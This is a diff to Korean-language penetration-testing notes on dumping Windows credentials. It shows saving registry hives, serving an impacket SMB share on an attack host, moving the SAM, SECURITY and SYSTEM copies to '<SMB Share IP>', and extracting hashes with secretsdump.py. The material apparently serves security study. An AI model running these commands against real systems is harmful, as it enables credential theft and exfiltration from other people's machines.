@@ -245,6 +245,13 @@ reg.exe save hklm\security C:\security.save
 - smb2support 옵션(최신 버전의 SMB가 지원), 공유 이름(`CompData`), 저장할 공격 호스트의 디렉토리(`/home/ltnbob/Documents`) 지정<br/>
 ```$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/```
 
+- move 명령으로 Hive 복사본 이동
+```
+C:\> move sam.save \\<SMB Share IP>\CompData
+C:\> move security.save \\<SMB Share IP>\CompData
+C:\> move system.save \\<SMB Share IP>\CompData
+```
+
 #### Impacket's secretsdump.py로 Dumping Hashes
 ```secretsdump.py -sam sam.save -security security.save -system system.save LOCAL```<br/>
 secretsdump 출력 : (uid:rid:lmhash:nthash)
